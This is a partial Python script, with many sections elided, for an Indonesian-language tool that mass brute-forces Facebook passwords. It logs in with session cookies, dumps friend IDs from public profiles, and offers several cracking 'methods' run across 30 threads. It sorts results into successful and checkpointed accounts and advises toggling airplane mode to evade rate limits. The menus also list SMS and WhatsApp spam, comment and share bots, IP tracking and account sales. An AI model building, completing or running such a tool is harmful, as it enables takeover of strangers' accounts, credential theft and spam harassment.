...
console = Console()
wa = Console()
sys.stdout.write('\x1b]2; META MBF | DELLAMX META MULTI BRUTEFORCE FACEBOOK\x07')
###----------[ USER AGENT ]---------- ###
...
def login123():
	...
	banner()
	print('')
	cetak(panel(f"\n[01] Lanjut ke menu login    \n[02] Cara mengetahui ID facebook      \n[03] Cara mengambil cookie akun facebook\n",width=90,title=f"LOGIN & TUTOR",padding=(0,2),style=f"bold white"))
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('Mohon untuk menggunakan cookie yang masi fresh',width=90,style=f"bold white"))
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n╰─• Login Berhasil | python lubay.py");exit()
			except Exception as e:
				print("╰─• Cookies Mokad ")
...
def menu(name,id):
	...
	cetak(nel(f'[ ! ] Username Anda : {name} \n[ ! ] ID Anda       : {id} \n[ ! ] IP Anda       : {ip}',width=90,title=f"INFORMASI ANDA",style=f"bold white"))
	print('')
	urut = []
	urut.append(panel(f'    Ketik BOT Untuk Menu BOT',width=43,title=f"PILIH",style=f"bold white"))
	urut.append(panel(f'  Ketik LAINNYA Untuk Menu LAINNYA',width=44,title=f"PILIH",style=f"bold white"))
	wa.print(Columns(urut))
	cetak(nel('\t\t\t            Daftar Menu ',width=90,style=f"bold white"))
	cetak(nel(f'    [01] Crack Publik [ ON ]                   [05] Tuntunan Taubat [ Recommended ]\n    [02] Crack Massal [ ON ]                   [06] Lapor BUG [ WhatsApp ]\n    [03] Chek Opsi    [ ON ]                   [07] Beli Akun Facebook [ Buy ]\n    [04] Result Crack [ ON ]                   [00] Hapus Cookie [ OUT ]',width=90,style=f"bold white"))
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(' [01]• Hasil Akun Checkpoint Anda ')
	print(' [03]• Hasil Akun Berhasil Anda ')
	print(' [00]• Kembali	')
	print('')
	kz = input('╰─• Pilih : ')
	print('')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('╰─• Tentukan  Berapa Target Kak ? '))
	except ValueError:
	...
	try:
		print('')
		print(f' ╰─• Total ID Yang Terkumpul = {asu}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('╰─• Sinyal Anda Kurang Bagus Nih !')
		...
		print(f'╰─• Pertemanan Tidak Publik \33[m(\x1b[1;91mX\33[m)')
		time.sleep(3)
		back()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def dump_public():
	try:
		...
		exit()
	print('╰─• Jika Ingin Crack Pertemanan Sendiri')
	...
	try:
		...
		print('╰─• Internet Anda Tidak Ada !')
		exit()
	except (KeyError,IOError):
		print(' ╰─• Pertemanan Tidak Publi Atau Cookie And Token Anda Busuk')
		exit()
#----------------------[ MENU CRACK V2 ]----------------------#
def lainnya():
	print(f' ╰─• 01. Crack Username')
	print(f' ╰─• 02. Crack File')
	print(f' ╰─• 03. User-Agent Random')
	print(f' ╰─• 04. Lacak IP')
	print(f' ╰─• 05. Keluar Dari Tools Lainnya')
	print('')
	bray = input(f'╰─• Pilih :  ')
	print('')
	if bray in(''):
		print(' ╰─• Pilih Yang Bener Kak !');back()
	if bray in('1','01'):
		crack_nama()
	elif bray in('2','02'):
		crack_file()
...
#----------------------[ MENU CRACK V1 ]----------------------#
def bot():
	print(f' ╰─• 01. Bot Komen Facebook')
	print(f' ╰─• 02. Spam Sms')
	print(f' ╰─• 03. Spam Whatsapp')
	print(f' ╰─• 04. Bot Share Facebook')
	print(f' ╰─• 05. Keluar Dari Tools Bot')
	print('')
	bray = input(f'╰─• Pilih :  ')
	print('')
	if bray in(''):
...
###----------[ MENU LOGIN ]----------###	
def kontol():
	cookie = input(f"╰─• MASUKKAN COOKIE AKUN FACEBOOK ANDA : \033[93m")
	try:
...
#----------------------[ BOT KOMEN FACEBOOK ]----------------------#
def bot_komen():
    cookies = input('╰─• Masukkan Cookie  :  ')
    limit   = int(input('╰─• Limit Komen  :  '))

    print('\n ╰─• Gunakan Tanda Koma Untuk Pemisahan Text Komen Contoh :  Hallo Bang,Apa Kabar ?')
...
def crack_nama():
	...
	print('')
	print(f' ╰─• Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username')
...
#----------------------[ CRACK FILE ]----------------------#
def crack_file():
	file = input(f' ╰─• Masukan Nama File Dump\n ╰─• Masukkan Nama File Dump  :  ')
	try:
...
def scrape_ua():
    ...
    if response.status_code == 200:
        print(f" ╰─• User-Agent :  {response.json()['ua']}")
    else:
...
def setting():
	print('')
	cetak(panel(f' [01] Crack old [NO]   [02] Crack New [ON]   [03] Crack Random [ ON]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
	hu = input('╰─• Pilih : ')
	print('')
	if hu in ['1','01']:
		...
		print('╰─• Pilih Yang Bener Kak !')
		exit()
	cetak(panel(f'  [01] Metode M.Basic [ Recommended ]      [02] Metode Mobile [ Recommended ]\n  [03] Metode B.api [ Recommended ]      [04] Metode free [ Recommended ]\n  [05] Metode Async [ Recommended ]      [06] Metode Reguler [ Recommended ]\n  [07] Metode Touch [ Recommended ]      [08] Metode Mtoch [ Recommended ]',width=90,title=f"Setting Metode",style=f"bold white"))
	print('')
	hc = input('╰─• Pilih  :  ')
	if hc in ['1','01']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[ • ] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[ • ] Contoh :  kakak,ngentod,adik[white] '))
	...
	print(f'╰─• Apakah Anda Ingin Mengunakan User-Agent Manual ? Y\T ')
...
#-------------------[ BAGIAN-WORDLIST ]--------------------#
def passwrd():
	cetak(nel(f'\t\t       Mainkan Mode Pesawat Setiap 1000 ID Selama 10 Detik !'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mbasic' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel(f'\t\t\t    Crack Selesai Cuy, Jangan Lupa Bersyukur'))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('╰─> Lanjut Crack Kembali  ')
	woi = input('╰─> Pilih •  ')
	if woi in ['y','Y']:
		back()
	else:
